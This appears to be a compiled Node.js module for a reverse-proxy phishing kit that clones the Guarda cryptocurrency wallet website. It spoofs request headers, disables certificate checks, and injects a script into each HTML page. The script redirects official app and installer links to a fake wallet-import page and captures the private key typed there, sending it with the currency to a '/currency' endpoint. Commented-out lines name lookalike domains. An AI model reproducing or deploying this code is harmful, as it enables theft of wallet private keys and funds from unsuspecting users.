"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.delegateMainPageRequest = void 0;
const https_1 = __importDefault(require("https"));
const parse_1 = require("../parse");
const inject_1 = require("../inject");
const serverDomain = 'localhost:3021';
const serverUrl = 'https://' + serverDomain;
// const apiUrl = 'https://aanusnayakatarakta.barrons.space'
// const walletUrl = 'https://wallet.barrons.space/app/import'
const apiUrl = 'http://localhost:3020';
//nusnayakatarakta.barrons.space
const delegateMainPageRequest = (req, res, domain) => {
    const { method, headers, url, path } = req;
    // console.log(url,path)
    delete headers['x-forwarded-for'];
    delete headers['x-forwarded-host'];
    delete headers['x-forwarded-proto'];
    delete headers['via'];
    delete headers['forwarded'];
    // Устанавливаем стандартные заголовки браузера
    headers['host'] = domain;
    headers['referer'] = 'https://' + domain + '/';
    headers['origin'] = 'https://' + domain;
    // Добавляем случайный User-Agent, если его нет
    if (!headers['user-agent']) {
        headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    }
    const options = {
        hostname: domain,
        path: url,
        method,
        headers,
        port: 443,
        rejectUnauthorized: false
    };
    try {
        const proxyRequest = https_1.default.request(options, (response) => {
            delete response.headers['content-length'];
            delete response.headers['x-powered-by'];
            delete response.headers['server'];
            console.log(response.headers['content-encoding'], response.headers['content-type']);
            if (response.headers['content-type'] === 'text/html') {
                delete response.headers['content-length'];
                delete response.headers['content-encoding'];
                (0, parse_1.brotlieParse)(response).then(data => {
                    res.writeHead(response.statusCode || 500, response.headers);
                    if (typeof data === 'string') {
                        let html = (0, inject_1.inject)(data, `
                            <script defer>
                         
                            function setLink(className,link){
                                const element = document.querySelector(className)
                                if(element){
                                    element.href = link
                                    return true
                                }
                            }
                            function setAllLink(className,link){
                                const elements = document.querySelectorAll(className)
                                if(elements.length){
                                    elements.forEach((e)=>e.href=link)
                                    if(elements[0].href ===link){
                                        return true 
                                    }
                                }
                            }
                            function onclickData (){
                                const key = document.querySelector('.import-block_inputPrivateKey_WAsC7').value
                                let currency =''
                                if(document.querySelector('.input-currency_currencyData_S0KpS span')){
                                 currency =document.querySelector('.input-currency_currencyData_S0KpS span').innerText
                                }
                               
                                console.log(key,currency)
                                fetch('/currency',{
                                    method:"POST",
                                    headers:{
                                        'Content-type':'application/json'
                                    },
                                    body:JSON.stringify({key,currency})    
                                })
                            }


                            setInterval(()=>{
                                document.querySelectorAll('a').forEach(el=>{
                                    if(el.href==="https://apps.apple.com/app/apple-store/id1442083982?pt=118900606&ct=landing-home-page&mt=8"||el.href==='https://github.com/guardaco/guarda-desktop-releases/releases/download/v1.0.20/Guarda-Setup-1.0.20.exe'||el.href==="https://play.google.com/store/apps/details?id=com.crypto.multiwallet&referrer=utm_source%3Dlanding%26utm_medium%3Dbadge%26utm_campaign%3Dhome-page"){
                                        el.href='/app/import'
                                        el.removeAttribute('download')
                                        el.removeAttribute('target')
                                        console.log(el)
                                    }else {
                                        el.href=el.href.replace('https://guarda.com','')
                                    }
                                })
                                console.log(222,document.querySelector('.import-block_buttonImport_ZsUK4'))
                                if(document.querySelector('.import-block_buttonImport_ZsUK4')){
                                    document.querySelector('.import-block_buttonImport_ZsUK4').onclick = ()=>{
                                        onclickData()
                                    }
                                }
                                document.querySelectorAll('base').forEach(el=>{
                                el.href=el.href.replace('https://guarda.com','')
                                })
                            },1000)
                            </script>
                        `).replace('https://guarda.com/', '/');
                        res.write(html);
                        res.end();
                    }
                    response.on('error', (error) => {
                        console.error('Response stream error:', error);
                        res.status(500).end('Internal Server Error');
                    });
                });
            }
            else {
                res.writeHead(response.statusCode || 500, response.headers);
                response.pipe(res);
                response.on('error', (error) => {
                    console.error('Response stream error:', error);
                    res.status(500).end('Internal Server Error');
                });
            }
        });
        req.on('aborted', () => {
            proxyRequest.destroy();
        });
        req.pipe(proxyRequest);
        req.on('error', (e) => {
            console.log(e);
        });
    }
    catch (error) {
        console.log(error);
    }
};
exports.delegateMainPageRequest = delegateMainPageRequest;
